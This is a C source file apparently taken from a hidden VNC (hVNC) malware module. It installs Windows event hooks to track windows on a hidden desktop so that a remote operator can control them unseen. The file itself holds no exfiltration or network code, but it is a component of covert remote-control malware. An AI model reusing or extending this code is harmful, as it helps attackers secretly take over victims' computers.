#include "..\includes.h"
#include <oleacc.h>
#include "windows.h"
#include "vnc_func.h"
#include "..\hvnc.h"

void StopWatcher(PHVNC lpServer)
{
    lpServer->WndWatcherInfo.bWatcherStarted=false;
    UnhookWinEvent(lpServer->WndWatcherInfo.hHook1);
    UnhookWinEvent(lpServer->WndWatcherInfo.hHook2);
    UnhookWinEvent(lpServer->WndWatcherInfo.hHook3);
    lpServer->WndWatcherInfo.bMessageBoxIsShown=false;
    return;
}

PHVNC HOOK2PHVNC(HWINEVENTHOOK hHook)
{
    PHVNC lpServer=NULL;

    EnterCriticalSection(&csHVNC);
    {
        if (lpHandles)
        {
            HVNC_HANDLE *lpHandle=lpHandles;
            while (lpHandle)
            {
                if ((lpHandle->lpServer->WndWatcherInfo.hHook1 == hHook) || (lpHandle->lpServer->WndWatcherInfo.hHook2 == hHook) || (lpHandle->lpServer->WndWatcherInfo.hHook3 == hHook))
                {
                    lpServer=lpHandle->lpServer;
                    break;
                }
                lpHandle=lpHandle->lpNext;
            }
        }
    }
    LeaveCriticalSection(&csHVNC);

    return lpServer;
}

bool IsWndPresent(PHVNC lpServer,HWND hWnd)
{
    bool bRet=false;
    while (hWnd=GetParent(hWnd))
    {
        bRet=(GetWndFromList(lpServer,hWnd));
        if (bRet)
            break;
    }
    return bRet;
}

bool IsItMsgBox(PHVNC lpServer,HWND hWnd)
{
    bool bRet=false;
    if ((lpServer->WndWatcherInfo.bMessageBoxIsShown) && (!(lpServer->DeskInfo.dwFlags & HVNC_NO_WINDOWS_MANIPULATION_TRICK)))
    {
        if (GetClassHash(hWnd) == 0x1BA347CA) ///"#32770"
        {
            char szTitle[200];
            GetWindowTextA(hWnd,szTitle,countof(szTitle));
            if (!lstrcmpA(szTitle,HVNC_MSG_TITLE))
                bRet=true;
        }
    }
    return bRet;
}

void CALLBACK HandleWndEvent(HWINEVENTHOOK hHook,DWORD dwEvent,HWND hWnd,LONG idObject,LONG idChild,DWORD dwEventThread,DWORD dwmsEventTime)
{
    PHVNC lpServer=HOOK2PHVNC(hHook);
    if (!lpServer)
        return;

    if (WaitForSingleObject(lpServer->EventsInfo.hVNCKillEvent,0) != WAIT_TIMEOUT)
    {
        StopWatcher(lpServer);
        return;
    }

    if ((idObject != OBJID_WINDOW) || (!hWnd) || (GetWindowClassFlags(lpServer,hWnd) & WCF_IGNOREWINDOW))
        return;

    WINDOWINFO wiInfo;
    wiInfo.cbSize=sizeof(WINDOWINFO);
    GetWindowInfo(hWnd,&wiInfo);

    Z_ORDER_LIST_ITEM *lpItem=0;
    if ((dwEvent != EVENT_OBJECT_CREATE) && (!(lpItem=GetWndFromList(lpServer,hWnd))))
        return;

    EnterCriticalSection(&lpServer->WndWatcherInfo.csWndsList);
    {
        switch (dwEvent)
        {
            case EVENT_OBJECT_CREATE:
            {
                lpItem=AppendWndToList(lpServer,hWnd);
                break;
            }
            case EVENT_OBJECT_HIDE:
            case EVENT_OBJECT_SHOW:
            {
                bool bVisible=IsWindowVisible(hWnd);
                if (((!bVisible) && (dwEvent == EVENT_OBJECT_HIDE)) || ((bVisible) && (dwEvent == EVENT_OBJECT_SHOW)))
                    break;

                bool bHidden=(dwEvent == EVENT_OBJECT_HIDE);
                if (lpItem->bHidden != bHidden)
                {
                    lpItem->bHidden=bHidden;

                    if (dwEvent == EVENT_OBJECT_SHOW)
                    {
                        if (lpItem->bTopMost)
                        {
                            if (lpItem->bAltTabItem)
                                SetForegroundWnd(lpServer,hWnd);
                            else
                                SetFrgWnd(lpServer,hWnd);
                        }
                    }
                    else if (!lpItem->lpNext)
                    {
                        Z_ORDER_LIST_ITEM *lpWnd=lpItem;
                        while (lpWnd)
                        {
                            hWnd=lpWnd->hWnd;
                            if ((IsWindowEx(lpServer,hWnd)) && (CheckWindowStyle(lpServer,hWnd)) && (!(GetWindowClassFlags(lpServer,hWnd) & (WCF_NO_CAPTURE|WCF_PAINT_ALWAYS_BOTTOM|WCF_PAINTMETHOD_NOP))))
                            {
                                SetForegroundWnd(lpServer,hWnd);
                                break;
                            }
                            lpWnd=lpWnd->lpPrev;
                        }
                    }
                }
                break;
            }
            case EVENT_OBJECT_DESTROY:
            {
                DeleteWndFromList(lpServer,hWnd);
                break;
            }
            case EVENT_OBJECT_LOCATIONCHANGE:
            {
                memcpy(&lpItem->rect,&wiInfo.rcWindow,sizeof(wiInfo.rcWindow));
                break;
            }
            case EVENT_SYSTEM_FOREGROUND:
            {
                if (!IsItMsgBox(lpServer,hWnd))
                {
                    if (!(GetWindowClassFlags(lpServer,hWnd) & WCF_MENU))
                    {
                        SetFrgWnd(lpServer,hWnd);
                        lpServer->lpGlobalVNCData->hForegroundWnd=hWnd;
                    }
                }
                break;
            }
        }

        RefreshList(lpServer);
    }
    LeaveCriticalSection(&lpServer->WndWatcherInfo.csWndsList);
    return;
}

void WINAPI WndWatcher(PHVNC lpServer)
{
    SetThreadDesktopEx(lpServer->hDesktop);
    lpServer->WndWatcherInfo.bWatcherStarted=true;
    CoInitialize(NULL);

    lpServer->WndWatcherInfo.hHook1=SetWinEventHook(EVENT_OBJECT_CREATE,EVENT_OBJECT_HIDE,NULL,HandleWndEvent,0,0,WINEVENT_OUTOFCONTEXT);
    lpServer->WndWatcherInfo.hHook2=SetWinEventHook(EVENT_OBJECT_LOCATIONCHANGE,EVENT_OBJECT_LOCATIONCHANGE,NULL,HandleWndEvent,0,0,WINEVENT_OUTOFCONTEXT);
    lpServer->WndWatcherInfo.hHook3=SetWinEventHook(EVENT_SYSTEM_FOREGROUND,EVENT_SYSTEM_FOREGROUND,NULL,HandleWndEvent,0,0,WINEVENT_OUTOFCONTEXT);

    while (WaitForSingleObject(lpServer->EventsInfo.hVNCKillEvent,0) == WAIT_TIMEOUT)
    {
        MSG msg;
        if (!GetMessage(&msg,NULL,0,0))
            break;
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    StopWatcher(lpServer);
    CoUninitialize();
    return;
}

void StartWatcher(PHVNC lpServer)
{
    if (lpServer->WndWatcherInfo.bWatcherStarted)
        return;
    SysCreateThread(lpServer,(LPTHREAD_START_ROUTINE)WndWatcher,lpServer,true);
    return;
}


